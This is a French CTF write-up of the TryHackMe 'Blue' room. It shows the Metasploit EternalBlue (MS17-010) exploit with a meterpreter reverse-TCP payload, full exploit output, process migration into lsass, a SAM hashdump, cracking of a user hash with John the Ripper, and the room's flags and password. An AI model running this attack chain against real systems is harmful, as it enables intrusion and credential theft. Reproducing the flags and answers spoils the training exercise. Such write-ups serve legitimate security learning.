# Write-up — Blue
**Date :** 2025-10-08
**Source :** THM
**Difficulté :** easy

---

## Contexte
CTF for beginner. OS Windows. Scan & Find exploit vuln.
@IP Cible : 10.10.213.127

Steps :
- Scan
- Gain access
- Escalate
- Cracking
- Find the flag

### PREP ####
Mise en context de la machine cible avec la DB MSF
-> Démarrage de postgresql
>systemctl start postgresql
>sudo -u postgres dbinit
-> Lancement de Metasploit
>msfconsole
-> Création du workspace dédié nommé Blue
>workspace -a Blue

#### SCAN ####

>db_nmap -sT -A 10.10.213.127 --script vuln

Result > File : THM_Blue_Annexe_1.png
    Il apparait que la machine a le port 445 (SMB) ouvert et que celle ci soit vulnérable CVE-2017-0143 (ms17-010 Eternalblue)

CSQ : Avec msf recherche de la ref ms17-010 > Configuration & run de l'exploit. Objectif : Obtenir un meterpreter sur la machine

##### GAIN ACCESS ####
msf> search msf17-010
Result: exploit/windows/smb/ms17_010_eternalblue apparu en position 0
msf> use 0
Configuration de l'exploit :
>Show options
A configurer : RHOST, LHOST, Payload
> hosts -R
Hosts
=====

address       mac  name  os_name       os_flavor  os_sp  purpose  info  comments
-------       ---  ----  -------       ---------  -----  -------  ----  --------
10.10.213.12             Windows 2008                    server
7

RHOSTS => 10.10.213.127

> set LHOST (IP LOCAL)
> set payload payload/windows/x64/meterpreter/reverse_tcp  

LPORT par défaut (4444)
Configuration > THM_Blue_Annexe_2.png

Lancement de l'exploit avec le payload staged
> run
msf exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.21.17.213:4444 
[*] 10.10.213.127:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.213.127:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.10.213.127:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.213.127:445 - The target is vulnerable.
[*] 10.10.213.127:445 - Connecting to target for exploitation.
[+] 10.10.213.127:445 - Connection established for exploitation.
[+] 10.10.213.127:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.213.127:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.213.127:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.213.127:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.213.127:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.213.127:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.213.127:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.213.127:445 - Sending all but last fragment of exploit packet
[*] 10.10.213.127:445 - Starting non-paged pool grooming
[+] 10.10.213.127:445 - Sending SMBv2 buffers
[+] 10.10.213.127:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.213.127:445 - Sending final SMBv2 buffers.
[*] 10.10.213.127:445 - Sending last fragment of exploit packet!
[*] 10.10.213.127:445 - Receiving response from exploit packet
[+] 10.10.213.127:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.213.127:445 - Sending egg to corrupted connection.
[*] 10.10.213.127:445 - Triggering free of corrupted buffer.
[-] 10.10.213.127:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.213.127:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.213.127:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.10.213.127:445 - Connecting to target for exploitation.
[+] 10.10.213.127:445 - Connection established for exploitation.
[+] 10.10.213.127:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.213.127:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.213.127:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.213.127:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.213.127:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.213.127:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.213.127:445 - Trying exploit with 17 Groom Allocations.
[*] 10.10.213.127:445 - Sending all but last fragment of exploit packet
[*] 10.10.213.127:445 - Starting non-paged pool grooming
[+] 10.10.213.127:445 - Sending SMBv2 buffers
[+] 10.10.213.127:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.213.127:445 - Sending final SMBv2 buffers.
[*] 10.10.213.127:445 - Sending last fragment of exploit packet!
[*] 10.10.213.127:445 - Receiving response from exploit packet
[+] 10.10.213.127:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.213.127:445 - Sending egg to corrupted connection.
[*] 10.10.213.127:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 10.10.213.127
[*] Meterpreter session 1 opened (10.21.17.213:4444 -> 10.10.213.127:49186) at 2025-10-08 14:15:47 +0200
[+] 10.10.213.127:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.213.127:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.213.127:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > 

Connexion a la machine obtenu !

##### ESCALATE ####
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
-> Accès avec privilège avec le compte SYSTEM

Migration vers un process de SYSTEM
meterpreter > getpid ==> Obtention du PID actuel
Current PId: 1300
meterpreter > ps ==> Listing des process en cours. Selection d'un process utilisé par le compte SYSTEM
[...]
716 lsass.exe NT AUTHORITY\SYSTEM
[...]
meterpreter > migrate 716
[*] Migrating from 1300 to 716...
[*] Migration completed successfully.

###### CRACKING ########

Accèder au MdP d'un user non defaut 

meterpreter> hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

Comme observé lors du scan, le nom PC indique que le user du PC est JON
Recupération du hash NT du user Jon : ffb43f0de35be4d9917ac0cc8ad57f8d

Utilisation de John the ripper pour récupérer le mdp en cleartext :
Ecriture du hash dans un fichier
> echo ffb43f0de35be4d9917ac0cc8ad57f8d > jon_hash.txt

Première tentative :
>john --format=NT jon_hash.txt
KO
Seconde tentative :
>john --format=NT --wordlist=/usr/share/wordlists/john.lst jon_hash.txt
KO
Troisième tentative : 
>john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt jon_hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (?)     --> **WIN**
1g 0:00:00:00 DONE (2025-10-08 15:01) 2.857g/s 29143Kp/s 29143Kc/s 29143KC/s alqui..alpusidi
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 

##### FIND FLAGS ####

Flag1? This flag can be found at the system root. 

Flag2? This flag can be found at the location where passwords are stored within Windows.

flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 

Recherche :

Je fais une recherche global avec le nom de fichier flag

meterpreter > search -f flag*
Found 6 results...
==================

Path                                                             Size (bytes)  Modified (UTC)
----                                                             ------------  --------------
c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag1.lnk  482           2019-03-17 20:26:42 +0100
c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag2.lnk  848           2019-03-17 20:30:04 +0100
c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag3.lnk  2344          2019-03-17 20:32:52 +0100
c:\Users\Jon\Documents\flag3.txt                                 37            2019-03-17 20:26:36 +0100
c:\Windows\System32\config\flag2.txt                             34            2019-03-17 20:32:48 +0100
c:\flag1.txt                                                     24            2019-03-17 20:27:21 +0100

meterpreter > cat "c:\flag1.txt"
flag{access_the_machine}

meterpreter > cat "c:\Windows\System32\config\flag2.txt"
flag{sam_database_elevated_access}

meterpreter > cat "c:\Users\Jon\Documents\flag3.txt"
flag{admin_documents_can_be_valuable}
